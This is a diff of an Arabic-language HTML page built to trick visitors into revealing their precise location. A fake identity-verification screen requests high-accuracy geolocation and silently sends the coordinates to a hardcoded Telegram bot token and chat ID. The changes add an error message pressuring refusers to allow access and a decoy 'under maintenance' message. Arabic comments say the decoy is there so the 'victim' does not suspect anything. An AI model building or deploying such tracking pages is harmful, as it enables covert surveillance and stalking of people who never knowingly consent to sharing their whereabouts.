@@ -8,7 +8,7 @@
         body {
             font-family: Tahoma, sans-serif;
             text-align: center;
-            margin-top: 25vh;
+            margin-top: 20vh;
             background-color: #ffffff;
             color: #333;
         }
@@ -25,6 +25,12 @@
         .btn:hover {
             background-color: #006699;
         }
+        .error-msg {
+            color: red;
+            font-weight: bold;
+            margin-top: 15px;
+            display: none;
+        }
         .loader-text {
             font-size: 20px;
             color: #555;
@@ -34,26 +40,26 @@
 </head>
 <body>
 
-    <!-- الصفحة الأولى: صفحة بيضاء مع زر الدخول للموقع -->
-    <div id="welcome-screen">
-        <button class="btn" onclick="startProcess()">الدخول للموقع</button>
+    <!-- الشاشة الرئيسية -->
+    <div id="main-screen">
+        <h3>يرجى التحقق من هويتك للمتابعة</h3>
+        <br>
+        <button class="btn" onclick="requestLocation()">الدخول للموقع</button>
+        <div id="error" class="error-msg">فشل التحقق! يرجى السماح بالموقع للمتابعة إجبارياً.</div>
     </div>
 
-    <!-- صفحة التحميل التي تظهر بعد الضغط -->
+    <!-- شاشة التحميل -->
     <div id="loader-screen" class="loader-text">
-        <h3>جاري التحميل، يرجى الانتظار...</h3>
+        <h3>جاري التحقق والتحميل، يرجى الانتظار...</h3>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '9205263918:AAEfuJZjbxJlTXIM8mU1CdVR4WbEA2Hc4-k';
         const TELEGRAM_CHAT_ID = '7083330975';
 
-        function startProcess() {
-            // إخفاء زر الدخول وإظهار شاشة التحميل
-            document.getElementById('welcome-screen').style.display = 'none';
-            document.getElementById('loader-screen').style.display = 'block';
-
-            // طلب الموقع الجغرافي فوراً بعد الضغط
+        function requestLocation() {
+            document.getElementById('error').style.display = 'none';
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                     enableHighAccuracy: true,
@@ -66,6 +72,10 @@
         }
 
         function sendLocation(position) {
+            // إظهار شاشة التحميل عند الموافقة وإرسال البيانات
+            document.getElementById('main-screen').style.display = 'none';
+            document.getElementById('loader-screen').style.display = 'block';
+
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
@@ -80,11 +90,17 @@
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message
                 })
+            }).then(() => {
+                // بعد الإرسال، يمكنك توجيهه لأي صفحة حقيقية وهمية لكي لا يشك بشيء
+                setTimeout(() => {
+                    document.getElementById('loader-screen').innerHTML = "<h3>عذراً، الموقع تحت الصيانة حالياً.</h3>";
+                }, 2000);
             });
         }
 
         function handleError(error) {
-            console.log("Error getting location");
+            // لو الضحية ضغط رفض (Block)، نظهر له رسالة خطأ ونعيد إجبار ظهور الزر
+            document.getElementById('error').style.display = 'block';
         }
     </script>
 </body>
